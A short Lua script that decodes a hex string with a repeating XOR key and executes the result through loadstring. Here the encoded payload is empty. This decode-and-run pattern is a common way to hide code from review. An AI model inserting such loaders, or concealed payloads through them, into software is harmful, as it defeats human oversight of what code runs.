local k={30,200,228,48,208,65,214,35,129,252,183,181,46,111,171,20,21,50,250,93,121,74,195,5,107,101,239,24,68,96,159,91}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
